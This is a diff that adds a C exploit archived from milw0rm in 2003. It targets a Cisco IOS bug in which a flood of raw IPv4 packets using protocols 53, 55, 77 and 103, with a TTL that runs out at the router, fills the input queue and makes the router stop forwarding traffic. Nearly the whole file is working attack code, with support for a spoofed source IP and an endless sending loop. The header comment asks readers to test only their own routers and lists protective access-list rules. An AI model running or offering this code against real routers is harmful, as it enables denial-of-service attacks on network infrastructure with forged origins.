@@ -1,0 +1,213 @@
+/*******************************************************/
+/* cisco-bug-44020.c - Copyright by Martin Kluge (martin@elxsi.de) */
+/*                                                                                            */
+/* Feel free to modify this code as you like, as long as you include */
+/* the above copyright statement.                                               */
+/*                                                                                            */
+/* Please use this code only to check your OWN cisco routers.         */
+/*                                                                                            */
+/*                                                                                            */
+/* This exploit uses the bug in recent IOS versions to stop router    */
+/* from processing traffic once the input queue is full.                    */
+/*                                                                                            */
+/*                                                                                            */
+/* Use access control lists as described in the CISCO advisory to     */
+/* protect your cisco routers:                                                       */
+/*                                                                                            */
+/* access-list 101 deny 53 any any                                              */
+/* access-list 101 deny 55 any any                                              */
+/* access-list 101 deny 77 any any                                              */
+/* access-list 101 deny 103 any any                                            */
+/*                                                                                            */
+/* This code was only tested on linux, no warranty is or will be        */
+/*                                                                                            */
+/* Usage: ./cisco-bug-44020 <src ip> <dst ip> <hops> <number>  */
+/* Source IP: Your source IP (or a spoofed source IP)                    */
+/* Destination IP: The IP of the vulnerable cisco router                  */
+/* Hops: The number of hops between you and the router,             */
+/* the time to live (ttl) should be 0 when the packet                      */
+/* is received by the cisco router.                                                 */
+/* Number: Number of packets to send (0 = loop)                         */
+/* provided.                                                                              */
+/*******************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <arpa/inet.h>
+#include <netinet/in.h>
+
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#define DEBUG
+
+#ifndef IPPROTO_RAW
+#define IPPROTO_RAW 0
+#endif
+
+/* IPv4 header */
+struct ipv4_pkt_header {
+unsigned int ipvhl:8; /* Version + Header length */
+unsigned int type_service:8; /* TOS(Type of Service) field */
+unsigned short packet_len; /* Header+Payload length */
+unsigned short ident; /* Identification field */
+unsigned short fragment; /* Fragment Offset field */
+unsigned int time_live:8; /* TTL(Time to Live) field */
+unsigned int protocol:8; /* Protocol field */
+unsigned short sum; /* Checksum field */
+struct in_addr src_ip; /* Source IP */
+struct in_addr dst_ip; /* Destination IP */
+};
+
+
+char proto[] = {53,55,77,103};
+
+
+/* Prototypes */
+int in_cksum (unsigned short *, int, int);
+
+
+/* Main function */
+int main (int argc, char *argv[]) {
+struct ipv4_pkt_header ipv4_hdr;
+struct sockaddr_in sin;
+struct timeval seed;
+
+unsigned long src_ip, dst_ip;
+int fd, hops, count, bytes;
+int len=0, i=0, n=0, loop=0;
+
+unsigned char *buf;
+
+/* Check command line args */ 
+if(argc != 5) {
+fprintf(stderr, "Usage: %s <src ip> <dst ip> <hops> <number>\n\n", argv[0]);
+return(EXIT_FAILURE);
+}
+
+src_ip = inet_addr(argv[1]);
+dst_ip = inet_addr(argv[2]);
+hops = atoi(argv[3]);
+count = atoi(argv[4]);
+
+if(count == 0) { loop=1; count=1; }
+
+#ifdef DEBUG
+printf("DEBUG: Hops: %i\n", hops);
+#endif
+
+/* Open a raw socket */
+if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
+fprintf(stderr, "Error: Cannot open raw socket.\n");
+return(EXIT_FAILURE);
+}
+
+/* Build the IPv4 header */
+ipv4_hdr.ipvhl = ((4 << 4) | 0x0f) & (5 | 0xf0); /* :) */
+ipv4_hdr.type_service = 0x10;
+
+#ifdef OSTYPE_BSD
+ipv4_hdr.packet_len = 0x14 + len;
+ipv4_hdr.fragment = 0x4000;
+#else
+ipv4_hdr.packet_len = htons(0x14 + len);
+ipv4_hdr.fragment = htons(0x4000);
+#endif
+
+ipv4_hdr.time_live = hops;
+ipv4_hdr.src_ip.s_addr = src_ip;
+ipv4_hdr.dst_ip.s_addr = dst_ip;
+
+while(n < count) {
+/* Seed the random generator */
+if(gettimeofday(&seed, NULL) == -1) {
+fprintf(stderr, "Error: Cannot seed the random generator.\n");
+return(EXIT_FAILURE);
+}
+
+srandom((unsigned int) (seed.tv_sec ^ seed.tv_usec));
+
+ipv4_hdr.protocol = proto[random() % 0x4];
+
+#ifdef DEBUG
+printf("DEBUG: Protocol: %i\n", ipv4_hdr.protocol);
+#endif
+
+ipv4_hdr.ident = htons(random() % 0x7fff);
+
+/* Calculate checksum */
+ipv4_hdr.sum = 0x0000;
+ipv4_hdr.sum = in_cksum((unsigned short *) &ipv4_hdr, 0x14 + len, 0);
+
+#ifdef DEBUG
+printf("DEBUG: Checksum: %i\n", ipv4_hdr.sum);
+#endif
+
+buf = malloc(0x14 + len);
+memset(buf, '\0', 0x14 + len);
+
+memcpy((unsigned char *) buf, (unsigned char *) &ipv4_hdr,
+0x14 + len);
+
+#ifdef DEBUG
+printf("DEBUG: ");
+for(i=0; i < 0x14 + len; i++)
+printf(" %02x", buf[i]);
+printf("\n");
+#endif
+
+
+memset(&sin, '\0', sizeof(struct sockaddr_in));
+sin.sin_family = AF_INET;
+sin.sin_addr.s_addr = dst_ip;
+
+bytes = sendto(fd, buf, 0x14 + len, 0, (struct sockaddr *) &sin,
+sizeof(struct sockaddr));
+
+#ifdef DEBUG
+printf("DEBUG: Wrote %i bytes.\n", bytes);
+#endif
+
+if(loop != 1) n++;
+
+free(buf);
+}
+
+close(fd);
+return(EXIT_SUCCESS);
+}
+
+
+int in_cksum(unsigned short *addr, int len, int csum) {
+register int sum = csum;
+unsigned short answer = 0;
+register unsigned short *w = addr;
+register int nleft = len;
+
+/*
+* Our algorithm is simple, using a 32 bit accumulator (sum), we add
+* sequential 16 bit words to it, and at the end, fold back all the
+* carry bits from the top 16 bits into the lower 16 bits.
+*/
+while (nleft > 1) {
+sum += *w++;
+nleft -= 2;
+}
+
+/* mop up an odd byte, if necessary */
+if (nleft == 1) {
+sum += htons(*(unsigned char *)w<<8);
+}
+/* add back carry outs from top 16 bits to low 16 bits */
+sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
+sum += (sum >> 16); /* add carry */
+answer = ~sum; /* truncate to 16 bits */
+return(answer);
+}
+
+
+// milw0rm.com [2003-07-21]
